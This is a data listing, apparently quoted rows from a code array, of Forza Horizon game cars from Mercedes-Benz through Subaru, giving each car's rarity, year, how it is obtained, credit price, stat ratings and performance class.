'L	HOR XB1 M-B AMG CLK about this car	1998	Mercedes-Benz AMG CLK GTR	Autoshow	2,000,000 CR	7.7	7.8	7.2	8.6	8.1	S1 848',
'L	HOR XB1 M-B AMG 87 about this car	1987	Mercedes-Benz AMG Hammer Coupe	Hard-to-Find: Festival reward	250,000 CR	7.8	5.7	5.9	6.9	5.7	A 701',
'R	HOR XB1 M-B C 63 about this car	2012	Mercedes-Benz C 63 AMG Coupé Black Series	Autoshow	143,000 CR	8.1	6.6	6.4	8.0	7.0	A 792',
'E	HOR XB1 M-B E 350 about this car	2017	Mercedes-Benz E 350 D 4MATIC Terrain "Project E-AT"	HL: Top Gear - Tier 4	250,000 CR	5.7	5.6	5.9	9.0	5.3	C 578',
'R	HOR XB1 M-B E 63 about this car	2013	Mercedes-Benz E 63 AMG	Wheelspin reward	105,000 CR	8.1	6.2	8.4	9.8	6.5	A 777',
'R	HOR XB1 M-B G 65 about this car	2013	Mercedes-Benz G 65 AMG	Autoshow	261,000 CR	6.6	5.6	8.0	10	5.6	A 712',
'E	HOR XB1 M-B G 63 about this car	2014	Mercedes-Benz G 63 AMG 6x6	HL: Top Gear - Tier 7	250,000 CR	6.4	6.6	5.7	8.9	6.0	B 674',
'E	HOR XB1 M-B SL about this car	2009	Mercedes-Benz SL 65 AMG Black Series	Autoshow	210,000 CR	8.2	7.0	6.7	8.3	7.3	S1 820',
'F	HOR XB1 M-B SL FE about this car	2009	Mercedes-Benz SL 65 AMG Black Series F.E.	Skill Tree:  Mercedes-Benz 300 SL Coupé	460,000 CR	8.2	7.0	6.7	8.3	7.3	S1 820',
'R	HOR XB1 M-B SLK about this car	2012	Mercedes-Benz SLK 55 AMG	Autoshow	78,000 CR	7.7	6.5	6.6	8.2	6.8	A 766',
'E	HOR XB1 M-B SLS about this car	2011	Mercedes-Benz SLS AMG	Autoshow	200,000 CR	8.1	6.9	6.9	8.5	7.4	S1 822',
'L	HOR XB1 M-B Super about this car	1929	Mercedes-Benz Super Sport Kurz Barker Roadster	DLC: Car Pass	5,000,000 CR	5.1	3.8	4.8	6.0	3.7	D 229',
'C	HOR XB1 M-B Unimog about this car	2014	Mercedes-Benz Unimog U5023	Autoshow	100,000 CR	3.8	6.4	3.4	3.5	4.2	D 163',
'L	HOR XB1 M-B W154 about this car	1939	Mercedes-Benz W154	Autoshow	10,000,000 CR	8.3	5.1	5.6	7.2	4.7	B 676',
'C	HOR XB1 M-B X-Class about this car	2018	Mercedes-Benz X-Class	Hard-to-Find: Festival reward	65,000 CR	5.2	5.5	4.4	6.7	5.2	D 417',
'R	HOR XB1 Mercury Cougar about this car	1970	Mercury Cougar Eliminator	HL: The Eliminator - Tier 24	250,000 CR	5.4	4.7	5.1	6.4	4.3	C 548',
'C	HOR XB1 Mercury Coupe about this car	1949	Mercury Coupe	Autoshow	45,000 CR	4.6	3.9	4.4	6.3	3.7	D 158',
'R	HOR XB1 Meyers Manx about this car	1971	Meyers Manx	Autoshow	35,000 CR	4.3	4.8	4.8	6.0	4.7	D 218',
'L	HOR XB1 MG Metro about this car	1986	MG Metro 6R4	Autoshow	125,000 CR	5.5	8.6	9.9	10	8.8	S1 852',
'C	HOR XB1 MG MGA about this car	1958	MG MGA Twin-Cam	Autoshow	40,000 CR	4.9	3.9	4.8	6.3	3.7	D 222',
'C	HOR XB1 MG MGB about this car	1965	MG MGB GT	Barn Find	30,000 CR	5.0	4.5	4.7	6.6	4.5	D 316',
'C	HOR XB1 MG TA about this car	1938	MG TA Midget	DLC: Car Pass	50,000 CR	3.9	3.9	3.6	5.0	3.9	D 100',
'L	HOR XB1 MINI Cooper about this car	1965	MINI Cooper S	Barn Find	30,000 CR	4.7	4.0	4.5	6.2	3.9	D 205',
'C	HOR XB1 MINI John 09 about this car	2009	MINI John Cooper Works	Autoshow	25,000 CR	6.2	6.2	5.8	7.4	6.5	B 639',
'C	HOR XB1 MINI John 18 Convertible about this car	2018	MINI John Cooper Works Convertible	Hard-to-Find: Festival reward	250,000 CR	6.2	5.9	5.8	7.3	6.1	B 639',
'C	HOR XB1 MINI John 18 Countryman about this car	2018	MINI John Cooper Works Countryman	Hard-to-Find: Festival reward	250,000 CR	5.9	5.6	5.6	8.1	5.3	C 580',
'R	HOR XB1 MINI John 12 about this car	2012	MINI John Cooper Works GP	Wheelspin reward	38,000 CR	6.2	5.8	5.8	7.4	5.7	B 642',
'E	HOR XB1 MINI X-Raid 14 about this car	2014	MINI X-Raid All4 Racing Countryman	Autoshow	500,000 CR	4.4	5.8	6.8	9.9	5.9	B 682',
'E	HOR XB1 MINI X-Raid 18 about this car	2018	MINI X-Raid John Cooper Works Buggy	Hard-to-Find: Festival reward	500,000 CR	5.4	6.4	6.5	9.1	6.3	B 674',
'C	HOR XB1 Mitsubishi Eclipse about this car	1995	Mitsubishi Eclipse GSX	DLC: Mitsubishi Motors Car Pack	25,000 CR	6.6	5.2	5.7	7.8	4.7	C 543',
'C	HOR XB1 Mitsubishi Galant about this car	1992	Mitsubishi Galant VR-4	DLC: Mitsubishi Motors Car Pack	25,000 CR	6.2	4.8	6.3	8.2	4.9	C 532',
'C	HOR XB1 Mitsubishi GTO about this car	1997	Mitsubishi GTO	DLC: Mitsubishi Motors Car Pack	20,000 CR	6.8	5.4	6.2	8.1	5.3	B 602',
'R	HOR XB1 Mitsubishi Lancer 99 about this car	1999	Mitsubishi Lancer Evolution VI GSR	DLC: Mitsubishi Motors Car Pack	28,000 CR	6.3	5.9	7.1	9.1	5.6	B 675',
'R	HOR XB1 Mitsubishi Lancer 04 about this car	2004	Mitsubishi Lancer Evolution VIII MR	DLC: Mitsubishi Motors Car Pack	31,000 CR	6.9	5.9	7.2	9.1	5.5	B 686',
'R	HOR XB1 Mitsubishi Lancer 06 about this car	2006	Mitsubishi Lancer Evolution IX MR	DLC: Mitsubishi Motors Car Pack	27,000 CR	6.7	5.9	6.4	8.3	5.5	B 649',
'R	HOR XB1 Mitsubishi Lancer 08 about this car	2008	Mitsubishi Lancer Evolution X GSR	DLC: Mitsubishi Motors Car Pack	43,000 CR	6.4	6.0	6.7	8.9	6.0	B 678',
'R	HOR XB1 Mitsubishi Starion about this car	1988	Mitsubishi Starion ESI-R	Hard-to-Find: Festival reward	250,000 CR	6.0	5.3	5.9	7.8	4.9	C 555',
'R	HOR XB1 Morgan 3 Wheeler about this car	2014	Morgan 3 Wheeler	Autoshow	50,000 CR	5.1	4.7	4.9	6.1	4.7	D 450',
'R	HOR XB1 Morgan Aero 18 about this car	2018	Morgan Aero GT	DLC: Car Pass	150,000 CR	7.2	7.9	7.1	8.7	7.9	S1 811',
'R	HOR XB1 Morgan Aero 10 about this car	2010	Morgan Aero Supersports	Autoshow	160,000 CR	7.1	6.3	6.6	8.3	6.3	A 766',
'C	HOR XB1 Morris Mini-Traveller about this car	1965	Morris Mini-Traveller	HL: Express Delivery - Tier 8	250,000 CR	3.7	4.0	3.5	4.4	4.0	D 100',
'C	HOR XB1 Morris Minor 58 about this car	1958	Morris Minor 1000	Autoshow	20,000 CR	4.0	3.9	3.6	4.9	3.8	D 100',
'C	HOR XB1 Morris Minor 53 about this car	1953	Morris Minor Series II Traveler	DLC: Fortune Island	25,000 CR	3.5	3.9	3.3	3.0	4.0	D 100',
'E	HOR XB1 Mosler MT900S about this car	2010	Mosler MT900S	Hard-to-Find: Festival reward	320,000 CR	8.1	10	8.8	9.9	10	S2 957',
'L	HOR XB1 Napier Napier-Railton about this car	1933	Napier Napier-Railton	Hard-to-Find: Festival reward	1,000,000 CR	7.1	5.1	5.3	6.8	5.6	B 628',
'C	HOR XB1 Nissan 240SX about this car	1993	Nissan 240SX SE	Autoshow	25,000 CR	5.9	4.8	5.1	6.7	4.6	D 449',
'C	HOR XB1 Nissan 370Z about this car	2010	Nissan 370Z	Autoshow	40,000 CR	7.2	6.3	6.2	7.9	5.7	A 716',
'C	HOR XB1 Nissan Fairlady 03 about this car	2003	Nissan Fairlady Z	Autoshow	35,000 CR	7.1	6.0	6.1	7.7	5.1	B 671',
'R	HOR XB1 Nissan Fairlady 69 about this car	1969	Nissan Fairlady Z 432	Autoshow	150,000 CR	5.4	4.7	5.4	6.4	4.6	D 439',
'E	HOR XB1 Nissan Fairlady 94 about this car	1994	Nissan Fairlady Z Version S Twin Turbo	Hard-to-Find: Festival reward	250,000 CR	6.7	6.0	6.0	7.7	5.5	B 655',
'E	HOR XB1 Nissan GT-R 17 about this car	2017	Nissan GT-R	Autoshow	132,000 CR	7.9	7.2	9.6	10	7.6	S1 836',
'E	HOR XB1 Nissan GT-R 17 PO about this car	2017	Nissan GT-R Preorder Car	Pre-Order bonus  / Gifted	132,000 CR	7.9	8.5	10	10	9.0	S1 900',
'E	HOR XB1 Nissan GT-R 12 about this car	2012	Nissan GT-R Black Edition	Autoshow	105,000 CR	8.0	6.8	9.4	10	7.2	S1 820',
'L	HOR XB1 Nissan GT-R 95 about this car	1995	Nissan Nismo GT-R LM	Wheelspin reward	1,100,000 CR	6.6	6.4	6.0	7.6	5.8	B 685',
'F	HOR XB1 Nissan GT-R 95 FE about this car	1995	Nissan Nismo GT-R LM F.E.	Skill Tree:  Nissan R390	1,350,000 CR	7.3	10	7.8	9.2	10	S1 886',
'R	HOR XB1 Nissan Pulsar about this car	1990	Nissan Pulsar GTI-R	Hard-to-Find: Festival reward	250,000 CR	6.2	5.2	7.1	8.9	4.8	C 598',
'L	HOR XB1 Nissan R390 about this car	1998	Nissan R390	Autoshow	730,000 CR	7.6	8.2	7.3	7.8	8.5	S1 877',
'R	HOR XB1 Nissan Sentra about this car	2018	Nissan Sentra Nismo	DLC: Car Pass	24,000 CR	5.8	6.1	5.8	7.4	6.2	C 588',
'C	HOR XB1 Nissan Silvia 92 about this car	1992	Nissan Silvia Club K s	Autoshow	25,000 CR	6.2	4.9	5.5	7.0	4.6	C 525',
'C	HOR XB1 Nissan Silvia 94 about this car	1994	Nissan Silvia K s	Autoshow	25,000 CR	6.5	5.4	5.9	7.5	5.0	C 600',
'C	HOR XB1 Nissan Silvia 98 about this car	1998	Nissan Silvia K s Aero	Autoshow	25,000 CR	6.5	5.5	5.9	7.5	5.0	C 593',
'C	HOR XB1 Nissan Silvia 00 about this car	2000	Nissan Silvia Spec-R	Autoshow	35,000 CR	6.6	6.1	6.1	7.7	5.2	B 643',
'R	HOR XB1 Nissan Skyline 71 about this car	1971	Nissan Skyline 2000GT-R	Autoshow	60,000 CR	5.6	4.6	5.4	6.4	4.5	D 455',
'R	HOR XB1 Nissan Skyline 93 about this car	1993	Nissan Skyline GT-R V-Spec	Autoshow	85,000 CR	6.5	5.4	6.2	7.7	5.6	B 620',
'E	HOR XB1 Nissan Skyline 97 about this car	1997	Nissan Skyline GT-R V-Spec	Autoshow	37,000 CR	6.9	5.6	6.5	8.0	5.5	B 633',
'E	HOR XB1 Nissan Skyline 02 about this car	2002	Nissan Skyline GT-R V-Spec II	HL: Street Scene - Tier 4	63,000 CR	6.8	6.0	6.5	8.1	6.0	B 691',
'R	HOR XB1 Nissan Skyline 87 about this car	1987	Nissan Skyline GTS-R (R31)	Autoshow	100,000 CR	6.4	4.9	5.7	7.2	4.6	C 538',
'R	HOR XB1 Nissan Skyline 73 about this car	1973	Nissan Skyline H/T 2000GT-R	Autoshow	170,000 CR	5.6	5.0	5.2	6.1	4.7	D 494',
'C	HOR XB1 Nissan Titan about this car	2016	Nissan Titan Warrior Concept	Autoshow	50,000 CR	5.6	5.0	5.0	7.3	4.8	D 491',
'F	HOR XB1 Nissan Titan FE about this car	2016	Nissan Titan Warrior Concept F.E.	DLC: VIP Membership	300,000 CR	5.6	6.2	5.2	7.2	5.8	C 583',
'E	HOR XB1 Noble M600 about this car	2010	Noble M600	HL: Speed Trap Hero - Tier 11	450,000 CR	8.8	8.8	7.8	9.3	9.0	S1 900',
'R	HOR XB1 Oldsmobile Hurst-Olds about this car	1969	Oldsmobile Hurst/Olds 442	Autoshow	65,000 CR	5.8	4.4	5.0	6.3	4.3	C 520',
'C	HOR XB1 Opel Kadett 63 about this car	1963	Opel Kadett A	DLC: Car Pass	25,000 CR	4.2	3.9	3.8	5.5	3.8	D 100',
'E	HOR XB1 Opel Manta about this car	1984	Opel Manta 400	Autoshow	100,000 CR	6.6	6.8	6.3	7.9	7.0	A 740',
'L	HOR XB1 Pagani Huayra 12 about this car	2012	Pagani Huayra	Autoshow	1,300,000 CR	8.8	8.4	7.4	8.9	8.8	S1 900',
'L	HOR XB1 Pagani Huayra 16 about this car	2016	Pagani Huayra BC	Autoshow	1,500,000 CR	8.9	9.8	8.0	9.4	10	S2 961',
'L	HOR XB1 Pagani Zonda 09 about this car	2009	Pagani Zonda Cinque Roadster	Autoshow	2,100,000 CR	7.8	9.5	7.4	8.9	10	S2 908',
'L	HOR XB1 Pagani Zonda 10 about this car	2010	Pagani Zonda R	Autoshow	1,700,000 CR	8.2	10	8.2	9.5	10	S2 966',
'F	HOR XB1 Pagani Zonda 10 FE about this car	2010	Pagani Zonda R F.E.	DLC: VIP Membership	1,950,000 CR	8.9	10	8.1	9.5	10	S2 986',
'L	HOR XB1 Peel P50 about this car	1962	Peel P50	Barn Find	20,000 CR	3.0	3.0	3.2	4.9	7.0	D 100',
'R	HOR XB1 Peel Trident about this car	1965	Peel Trident	DLC: Car Pass	25,000 CR	3.0	3.0	3.2	4.5	5.4	D 100',
'E	HOR XB1 Penhall The about this car	2011	Penhall The Cholla	HL: Cross Country - Tier 14	100,000 CR	5.1	6.4	7.2	8.5	6.3	B 646',
'R	HOR XB1 Peugeot 205 91 about this car	1991	Peugeot 205 Rallye	Hard-to-Find: Festival reward	250,000 CR	5.3	5.6	4.8	7.6	5.4	C 504',
'L	HOR XB1 Peugeot 205 about this car	1984	Peugeot 205 T16	Autoshow	200,000 CR	5.8	5.4	6.0	6.6	5.5	C 597',
'F	HOR XB1 Peugeot 205 FE about this car	1984	Peugeot 205 T16 F.E.	Wheelspin reward	450,000 CR	6.9	8.3	10	9.3	8.4	S1 899',
'L	HOR XB1 Peugeot 207 about this car	2007	Peugeot 207 Super 2000	Hard-to-Find: Festival reward	250,000 CR	6.1	7.8	7.4	8.8	8.1	A 774',
'E	HOR XB1 Plymouth Atomic about this car	1958	Plymouth Atomic Punk Bubbletop	DLC: Barrett-Jackson Car Pack	105,000 CR	7.1	5.8	6.2	7.4	4.9	A 717',
'R	HOR XB1 Plymouth Cuda about this car	1971	Plymouth Cuda 426 Hemi	Autoshow	160,000 CR	6.4	4.7	5.2	6.5	4.3	C 560',
'R	HOR XB1 Plymouth Fury about this car	1957	Plymouth Fury	Hard-to-Find: Festival reward	250,000 CR	6.1	4.5	5.1	6.5	4.4	C 518',
'E	HOR XB1 Plymouth Hemi about this car	1970	Plymouth Hemi Cuda Convertible Barrett-Jackson Edition	DLC: Barrett-Jackson Car Pack	55,000 CR	6.4	5.6	5.7	7.2	5.2	B 689',
'C	HOR XB1 Polaris RZR about this car	2015	Polaris RZR XP 1000 EPS	Autoshow	25,000 CR	4.5	5.8	5.5	7.1	6.2	D 464',
'E	HOR XB1 Pontiac Firebird 68 about this car	1968	Pontiac Firebird	Hard-to-Find: Festival reward	250,000 CR	5.9	4.4	5.0	6.2	4.3	C 509',
'R	HOR XB1 Pontiac Firebird 77 about this car	1977	Pontiac Firebird Trans Am	Autoshow	45,000 CR	6.0	4.5	5.0	6.1	4.2	D 431',
'C	HOR XB1 Pontiac Firebird 87 about this car	1987	Pontiac Firebird Trans Am GTA	Autoshow	25,000 CR	6.2	4.8	5.4	6.8	4.5	C 505',
'C	HOR XB1 Pontiac Firebird 73 about this car	1973	Pontiac Firebird Trans Am SD-455	Wheelspin reward	61,000 CR	6.3	4.7	5.1	6.5	4.4	C 536',
'L	HOR XB1 Pontiac GTO 65 FH4 about this car	1965	Pontiac GTO	Hard-to-Find: Festival reward	48,000 CR	5.6	4.3	5.0	6.3	4.3	C 514',
'R	HOR XB1 Pontiac GTO 69 about this car	1969	Pontiac GTO Judge	Autoshow	90,000 CR	5.8	4.4	5.0	6.3	4.3	C 514',
'L	HOR XB1 Porsche 3 917 about this car	1970	Porsche 3 917 LH	Hard-to-Find: Festival reward	250,000 CR	8.5	7.0	8.0	9.4	6.4	S1 868',
'L	HOR XB1 Porsche 23 917-20 about this car	1971	Porsche 23 917/20	Autoshow	10,000,000 CR	8.3	7.1	8.0	9.5	6.6	S1 861',
'L	HOR XB1 Porsche 46 356 about this car	1951	Porsche 46 356 SL Gmünd Coupe	Hard-to-Find: Festival reward	250,000 CR	4.6	4.8	3.9	6.4	4.6	D 199',
'L	HOR XB1 Porsche 185 959 about this car	1986	Porsche 185 959 Prodrive Rally Raid	DLC: Car Pass	205,000 CR	6.8	6.9	8.8	10	7.1	A 779',
'E	HOR XB1 Porsche 356A about this car	1957	Porsche 356A Speedster	Autoshow	300,000 CR	4.7	4.1	4.1	6.8	3.8	D 185',
'L	HOR XB1 Porsche 356 59 about this car	1959	Porsche 356 A 1600 Super	DLC: Car Pass	240,000 CR	4.9	4.0	3.8	6.1	3.7	D 180',
'E	HOR XB1 Porsche 356 64 about this car	1964	Porsche 356 C Cabriolet Emory Special	Hard-to-Find: Festival reward	250,000 CR	6.1	5.9	6.8	8.4	5.7	B 687',
'E	HOR XB1 Porsche 356 60 about this car	1960	Porsche 356 RSR from Emory Motorsport	Hard-to-Find: Festival reward	250,000 CR	7.1	7.7	7.4	9.0	8.1	S1 846',
'L	HOR XB1 Porsche 550A about this car	1955	Porsche 550A Spyder	Autoshow	600,000 CR	5.9	4.2	5.4	6.9	3.7	D 387',
'L	HOR XB1 Porsche 718 60 about this car	1960	Porsche 718 RS 60	Autoshow	1,000,000 CR	6.3	6.5	6.7	7.8	5.5	A 716',
'L	HOR XB1 Porsche 718 60 WP about this car	1960	Porsche 718 RS 60 "Welcome Pack"	DLC: Welcome Pack	1,000,000 CR	6.6	7.4	7.2	8.8	6.5	A 800',
'E	HOR XB1 Porsche 718 18 about this car	2018	Porsche 718 Cayman GTS	Hard-to-Find: Festival reward	250,000 CR	7.3	7.5	7.3	8.9	8.0	S1 808',
'L	HOR XB1 Porsche 906 about this car	1966	Porsche 906 Carrera 6	Hard-to-Find: Festival reward	250,000 CR	6.8	6.5	6.9	8.1	5.5	A 748',
'E	HOR XB1 Porsche 911 95 Gunther about this car	1995	Porsche 911 Carrera 2 by Gunther Werks	Autoshow	500,000 CR	7.2	7.6	8.3	7.6	8.0	S1 823',
'L	HOR XB1 Porsche 911 73 about this car	1973	Porsche 911 Carrera RS	Autoshow	200,000 CR	6.1	5.7	6.7	8.1	5.0	B 631',
'E	HOR XB1 Porsche 911 19 Carrera about this car	2019	Porsche 911 Carrera S	DLC: Car Pass	105,000 CR	7.8	8.1	7.4	8.9	8.4	S1 840',
'L	HOR XB1 Porsche 911 98 about this car	1998	Porsche 911 GT1 Strassenversion	Autoshow	2,500,000 CR	7.6	8.2	7.1	8.7	8.8	S1 850',
'E	HOR XB1 Porsche 911 95 about this car	1995	Porsche 911 GT2	Autoshow	550,000 CR	7.1	6.6	7.6	9.2	7.0	A 774',
'E	HOR XB1 Porsche 911 12 GT2 about this car	2012	Porsche 911 GT2 RS	Autoshow	240,000 CR	8.0	8.3	8.7	9.9	8.9	S1 882',
'E	HOR XB1 Porsche 911 18 about this car	2018	Porsche 911 GT2 RS	Autoshow	315,000 CR	8.2	8.8	8.4	9.7	9.4	S2 910',
'E	HOR XB1 Porsche 911 04 about this car	2004	Porsche 911 GT3	Autoshow	65,000 CR	7.5	7.2	7.8	9.1	7.6	S1 803',
'E	HOR XB1 Porsche 911 16 about this car	2016	Porsche 911 GT3 RS	Autoshow	235,000 CR	8.0	9.6	8.4	9.6	10	S2 904',
'E	HOR XB1 Porsche 911 16 PO about this car	2016	Porsche 911 GT3 RS Preorder Car	Pre-Order bonus  / HL: The Eliminator - Tier 20	235,000 CR	8.6	10	8.7	9.9	10	S2 998',
'E	HOR XB1 Porsche 911 19 GT3 about this car	2019	Porsche 911 GT3 RS	Hard-to-Find: Festival reward	255,000 CR	8.3	9.7	8.3	9.6	10	S2 915',
'E	HOR XB1 Porsche 911 12 GT3 about this car	2012	Porsche 911 GT3 RS 4.0	Autoshow	200,000 CR	7.8	8.1	8.6	9.8	8.7	S1 847',
'L	HOR XB1 Porsche 911 90 about this car	1990	Porsche 911 reimagined by Singer - DLS	Hard-to-Find: Festival reward	1,800,000 CR	8.0	7.4	8.5	9.8	7.8	S1 855',
'L	HOR XB1 Porsche 911 82 about this car	1982	Porsche 911 Turbo 3.3	Autoshow	150,000 CR	6.4	5.9	6.5	6.7	5.6	B 688',
'E	HOR XB1 Porsche 911 14 about this car	2014	Porsche 911 Turbo S	Autoshow	150,000 CR	8.3	6.6	9.1	10	7.2	S1 827',
'R	HOR XB1 Porsche 914-6 about this car	1970	Porsche 914/6	Hard-to-Find: Festival reward	24,000 CR	5.3	4.7	5.2	7.0	4.2	D 408',
'L	HOR XB1 Porsche 918 about this car	2014	Porsche 918 Spyder	Autoshow	850,000 CR	8.9	9.2	10	10	9.7	S2 942',
'E	Missing Car about this car	1993	Porsche 928 GTS	Hard-to-Find: Festival reward	250,000 CR	7.0	5.9	6.6	7.9	6.0	B 698',
'R	HOR XB1 Porsche 944 about this car	1989	Porsche 944 Turbo	Autoshow	35,000 CR	6.5	5.9	6.5	8.1	6.0	B 659',
'L	HOR XB1 Porsche 959 about this car	1987	Porsche 959	Autoshow	400,000 CR	7.7	6.3	9.0	10	6.7	A 784',
'R	HOR XB1 Porsche 968 about this car	1993	Porsche 968 Turbo S	DLC: Car Pass	140,000 CR	6.9	6.1	6.6	8.3	6.2	A 716',
'E	HOR XB1 Porsche Carrera about this car	2003	Porsche Carrera GT	Autoshow	400,000 CR	8.0	8.1	7.5	9.0	8.6	S1 866',
'R	HOR XB1 Porsche Cayenne 12 about this car	2012	Porsche Cayenne Turbo	Autoshow	110,000 CR	7.1	6.0	7.7	9.5	6.3	A 740',
'R	HOR XB1 Porsche Cayenne 18 about this car	2018	Porsche Cayenne Turbo	Wheelspin reward	220,000 CR	7.2	6.5	8.7	10	7.1	A 769',
'E	HOR XB1 Porsche Cayman 16 about this car	2016	Porsche Cayman GT4	Autoshow	85,000 CR	7.5	8.3	7.8	9.3	8.8	S1 840',
'R	HOR XB1 Porsche Cayman 15 about this car	2015	Porsche Cayman GTS	HL: Road Racing - Tier 8	80,000 CR	7.1	7.2	7.0	8.6	7.5	A 791',
'R	HOR XB1 Porsche Macan 15 about this car	2015	Porsche Macan Turbo	Autoshow	105,000 CR	6.7	6.0	7.0	8.9	6.4	A 708',
'R	HOR XB1 Porsche Macan 19 about this car	2019	Porsche Macan Turbo	Hard-to-Find: Festival reward	105,000 CR	6.9	5.9	7.3	10	6.2	A 720',
'R	HOR XB1 Porsche Panamera about this car	2017	Porsche Panamera Turbo	Autoshow	150,000 CR	7.9	6.6	8.5	10	7.2	A 789',
'L	HOR XB1 Quadra V-Tech about this car	2058	Quadra Turbo-R V-Tech	Win the "_:NIGHTCITY.exe_" Street Scene event	1,000,000 CR	7.8	8.4	8.5	10	8.6	S1 890',
'L	HOR XB1 Quartz Regalia about this car	723	Quartz Regalia	Hard-to-Find: Festival reward	100,000 CR	6.2	5.9	7.0	9.0	5.6	B 675',
'L	HOR XB1 Quartz Regalia Type-D about this car	723	Quartz Regalia Type-D	Skill Tree:  Quartz Regalia	500,000 CR	5.0	6.5	6.7	9.8	6.5	C 597',
'E	HOR XB1 Radical RXC about this car	2015	Radical RXC Turbo	Autoshow	330,000 CR	7.3	10	8.0	9.4	10	S2 958',
'L	HOR XB1 RAESR Tachyon about this car	2019	RAESR Tachyon Speed	Hard-to-Find: Festival reward	1,050,000 CR	8.7	8.5	6.9	8.6	8.9	S2 969',
'R	HOR XB1 RAM 1500 about this car	2017	RAM 1500 Rebel TRX Concept	DLC: Fortune Island	100,000 CR	6.0	6.2	7.7	9.2	6.9	A 716',
'C	HOR XB1 RAM 2500 about this car	2017	RAM 2500 Power Wagon	HL: Dirt Racing - Tier 8	47,000 CR	6.1	5.2	4.7	5.2	5.1	C 518',
'C	HOR XB1 Reliant Supervan about this car	1972	Reliant Supervan III	Autoshow	35,000 CR	3.9	3.3	4.1	5.4	3.6	D 100',
'R	HOR XB1 Renault 5 about this car	1980	Renault 5 Turbo	Autoshow	120,000 CR	5.5	5.0	6.3	8.0	4.8	C 512',
'F	HOR XB1 Renault 5 FE about this car	1980	Renault 5 Turbo F.E.	Wheelspin reward	316,000 CR	7.5	8.5	8.8	10	9.3	S1 900',
'L	HOR XB1 Renault Alpine about this car	1973	Renault Alpine A110 1600s	HL: Dirt Racing - Tier 16	98,000 CR	5.9	5.1	5.8	7.2	4.6	C 522',
'C	HOR XB1 Renault Clio 10 about this car	2010	Renault Clio R.S.	Autoshow	25,000 CR	5.9	5.8	5.8	7.4	5.5	C 598',
'F	HOR XB1 Renault Clio 10 FE about this car	2010	Renault Clio R.S. F.E.	Wheelspin reward	275,000 CR	5.9	7.7	6.2	7.7	7.7	A 701',
'R	HOR XB1 Renault Clio 16 about this car	2016	Renault Clio R.S. 16 Concept	Hard-to-Find: Festival reward	250,000 CR	6.4	7.3	6.5	8.1	7.4	A 731',
'C	HOR XB1 Renault Clio 07 about this car	2007	Renault Clio RS 197	Hard-to-Find: Festival reward	250,000 CR	5.9	6.1	5.6	6.9	6.3	C 592',
'C	HOR XB1 Renault Clio 13 about this car	2013	Renault Clio R.S. 200 EDC	Autoshow	29,000 CR	5.9	6.0	6.0	7.6	6.1	B 606',
'R	HOR XB1 Renault Clio 93 about this car	1993	Renault Clio Williams	HL: Street Scene - Tier 8	30,000 CR	5.6	5.2	5.7	7.3	4.9	C 502',
'R	HOR XB1 Renault Megane 08 about this car	2008	Renault Mégane R26.R	HL: The Eliminator - Tier 10	250,000 CR	6.2	7.0	6.3	7.9	7.2	A 704',
'R	HOR XB1 Renault Megane 18 about this car	2018	Renault Megane R.S.	Hard-to-Find: Festival reward	250,000 CR	6.5	7.0	6.0	7.6	7.1	A 702',
'C	HOR XB1 Renault Megane 10 about this car	2010	Renault Megane R.S. 250	Autoshow	30,000 CR	6.3	6.4	6.1	7.8	6.5	B 666',
'R	HOR XB1 Renault Sport about this car	2003	Renault Sport Clio V6	Hard-to-Find: Festival reward	250,000 CR	6.3	5.9	5.9	7.3	5.6	B 627',
'L	HOR XB1 Rimac C Two about this car	2019	Rimac Concept Two	Hard-to-Find: Festival reward	2,000,000 CR	9.3	8.1	10	10	8.5	S2 994',
'E	HOR XB1 RJA 37 Pro about this car	2016	RJ Anderson 37 Polaris RZR-Rockstar Energy Pro 2 Truck	Autoshow	500,000 CR	6.6	6.7	6.2	7.6	6.5	S1 815',
'E	HOR XB1 Rossion Q1 about this car	2010	Rossion Q1	Hard-to-Find: Festival reward	250,000 CR	7.5	8.3	7.6	9.1	8.7	S1 855',
'R	HOR XB1 Rover SD1 about this car	1984	Rover SD1 Vitesse	Hard-to-Find: Festival reward	250,000 CR	5.8	5.1	5.0	5.9	4.7	D 498',
'E	HOR XB1 Saleen S5S about this car	2010	Saleen S5S Raptor	DLC: Fortune Island  (Treasure Chest 8)	180,000 CR	8.4	8.0	7.9	9.4	8.3	S1 873',
'E	HOR XB1 Saleen S7 about this car	2004	Saleen S7	Autoshow	388,000 CR	8.3	8.2	7.8	9.3	8.4	S1 879',
'E	HOR XB1 Shelby 1000 about this car	2012	Shelby 1000	Hard-to-Find: Festival reward	105,000 CR	8.7	6.0	6.2	7.8	6.3	A 782',
'L	HOR XB1 Shelby Cobra 65 427 about this car	1965	Shelby Cobra 427 S/C	Autoshow	2,100,000 CR	6.6	5.4	5.9	7.5	4.8	B 700',
'L	HOR XB1 Shelby Cobra 65 Daytona about this car	1965	Shelby Cobra Daytona Coupe	Autoshow	8,000,000 CR	7.3	5.0	5.5	6.5	4.8	B 645',
'L	HOR XB1 Shelby Monaco about this car	1963	Shelby Monaco King Cobra	DLC: Barrett-Jackson Car Pack	550,000 CR	7.4	7.2	7.1	8.7	6.5	S1 837',
'E	HOR XB1 SG Spano about this car	2016	Spania GTA Spano	Autoshow	800,000 CR	9.0	8.7	7.7	9.1	9.3	S2 931',
'E	HOR XB1 Subaru 199 WRX about this car	2016	Subaru 199 WRX STI VT15R Rally Car	Autoshow	300,000 CR	5.9	7.7	8.8	10	8.0	A 762',
'L	HOR XB1 Subaru 199 WRX WP about this car	2016	Subaru 199 WRX STI VT15R Rally Car "Welcome Pack"	DLC: Welcome Pack	300,000 CR	6.1	7.3	9.2	10	7.7	A 800',
'C	HOR XB1 Subaru BRZ about this car	2013	Subaru BRZ	Autoshow	32,000 CR	6.4	5.2	5.8	7.3	4.7	C 562',
'L	HOR XB1 Subaru Impreza 98 about this car	1998	Subaru Impreza 22B STi	Barn Find	110,000 CR	6.4	6.0	6.6	8.5	5.5	B 650',
'C	HOR XB1 Subaru Impreza 04 about this car	2004	Subaru Impreza WRX STi	Wheelspin reward	28,000 CR	6.6	5.8	7.5	9.4	5.5	B 670',
'C	HOR XB1 Subaru Impreza 05 about this car	2005	Subaru Impreza WRX STI	Autoshow	51,000 CR	6.7	5.9	7.7	9.5	5.5	B 694',
'R	HOR XB1 Subaru Impreza 08 about this car	2008	Subaru Impreza WRX STI	Autoshow	31,000 CR	6.4	6.0	6.9	9.2	6.1	B 681',
'C	HOR XB1 Subaru Legacy about this car	1990	Subaru Legacy RS	Autoshow	25,000 CR	6.1	4.8	5.6	7.4	4.9	C 503',
'R	HOR XB1 Subaru WRX 11 about this car	2011	Subaru WRX STI	Autoshow	33,000 CR	6.7	6.0	6.7	8.5	6.0	B 682',
